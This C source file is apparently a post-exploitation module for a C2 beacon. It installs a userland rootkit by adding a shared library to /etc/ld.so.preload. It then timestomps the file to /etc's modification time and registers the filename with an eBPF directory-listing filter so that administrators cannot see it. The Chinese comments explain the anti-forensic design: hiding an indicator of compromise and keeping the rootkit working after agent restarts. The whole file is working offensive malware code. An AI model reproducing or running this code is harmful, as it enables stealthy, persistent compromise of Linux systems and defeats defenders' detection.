/// ld_preload_install.c — BOF: install a userland rootkit via /etc/ld.so.preload
/// Compile: gcc -c -o ld_preload_install.o ld_preload_install.c -include bof_api.h -Os -fPIC
/// Usage: execute bof ld_preload_install.o <path-to-so-already-dropped>
///
/// Appends the .so path to /etc/ld.so.preload (creating the file if missing,
/// preserving existing entries), then timestomps it to /etc's mtime.

#include "bof_api.h"

#define O_RDONLY   00
#define O_WRONLY   01
#define O_CREAT    0100
#define O_TRUNC    01000

/// 登记 `ld.so.preload` 到 hide_names（**ISS-072**）。
///
/// 为什么不登记就是漏洞：该文件在发行版里**默认不存在**，它的出现本身就是 IOC ——
/// 与方案 §A8 否掉 rc.local/profile.d 用的是同一条判据（"新增一个本不存在的文件
/// 本身就是 IOC"）。装了用户态 rootkit 之后，对手一条 `ls /etc` 就数得出
/// `ld.so.preload`。内容层由 P3 挡住了（`cat` 读回来是空白），但**枚举层没人管**：
/// `redact.c`/`hide.c` 的过滤只认 `hide_names` 里登记过的名字，不登记就没有触发
/// 条件（与 ISS-071 的 ko_load 完全同型 —— 同一条不变量，两处漏接）。
///
/// 登记的是**基名**而非全路径：`hide.c` 的 getdents64 过滤按 dirent 名字比对，
/// 全路径永远比不中。副作用是它会连带过滤全系统同名 dirent —— 而
/// `ld.so.preload` 只存在于 /etc 下，没有误伤面。（`ssh_persist.c` 的
/// authorized_keys 正相反，那边是**刻意不藏**，源码里有 @visible 论证。）
///
/// 不影响 rootkit 生效：ld.so 是按**显式路径** open 它的，而 getdents 过滤管不到
/// 路径查找（陷阱 1）—— 这也正是"藏 pin 名"能起作用、而"藏 pin 路径"不能的原因。
/// `evacuate.c` 的还原同理走显式路径，不受影响。
static void ax_pl_register(void) {
    int hr = AxHideNameAdd((const char *)0, "ld.so.preload");
    BeaconPrintf(CALLBACK_OUTPUT, "    hide: ld.so.preload -> %s\n",
                 hr == 0 ? "ok" : (hr == -2 ? "no-map" : "fail"));
    if (hr < 0)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [*] 未自动登记（eBPF 未加载 / pin 未知）——\n"
                     "        对手 `ls /etc` 能看见 ld.so.preload。手工补：\n"
                     "        execute bof hide_add.o <pin> ld.so.preload\n");
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int so_len = 0;
    char *so = BeaconDataExtract(&parser, &so_len);
    if (!so || so_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ld_preload_install: missing .so path\n");
        return;
    }
    /* ★ so 是参数 blob 的切片，**不保证 NUL 终止**（见 bof_api.h §ISS-073）。
     * 原来只在回执里裸用 %s，看起来"无害" —— 但回执是要发给服务端的字符串，
     * 尾巴带的是同一 msgpack 缓冲区的下一个键，等于把协议内部结构外泄。
     * 拷进有终止的本地缓冲后**后面一律用它**，避免再有人顺手用裸指针。 */
    char sobuf[256];
    if (so_len >= (int)sizeof(sobuf)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ld_preload_install: .so path too long (%d)\n", so_len);
        return;
    }
    AxCStr(sobuf, sizeof(sobuf), so, so_len);

    char *path = "/etc/ld.so.preload";

    // Read existing entries (if any)
    char *old = (char *)0;
    int old_len = AxReadFileToBuffer(path, &old, 65536);
    if (old_len < 0) old_len = 0;

    // Skip append if the path is already present
    if (old && old_len > 0) {
        for (int i = 0; i + so_len <= old_len; i++) {
            if (AxStrncmp(old + i, sobuf, so_len) == 0 &&
                (i == 0 || old[i - 1] == '\n' || old[i - 1] == ' ')) {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] ld_preload_install: already present\n");
                AxFree(old);
                /* 文件已存在 = 我们的 .so 已经在里面 ⇒ 不变量同样成立，要登记。
                 * 这条不是冗余：eBPF 重载 / agent 重启后 hide_names 是空的，
                 * 而文件还在盘上 —— 只补写不登记就会留下一个可枚举的 IOC。 */
                ax_pl_register();
                return;
            }
        }
    }

    int fd = AxOpenFile(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        if (old) AxFree(old);
        BeaconPrintf(CALLBACK_ERROR, "[-] ld_preload_install: cannot open %s\n", path);
        return;
    }

    if (old && old_len > 0) AxWriteFile(fd, old, old_len);
    AxWriteFile(fd, sobuf, so_len);
    AxWriteFile(fd, "\n", 1);
    AxCloseFile(fd);
    if (old) AxFree(old);

    // Timestomp to /etc directory mtime
    long as = 0, ans = 0, ms = 0, mns = 0;
    if (AxFileTimes("/etc", &as, &ans, &ms, &mns) == 0) {
        AxUtimensat(-100, path, as, ans, ms, mns);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ld_preload_install: %s -> %s\n", sobuf, path);
    ax_pl_register();
}
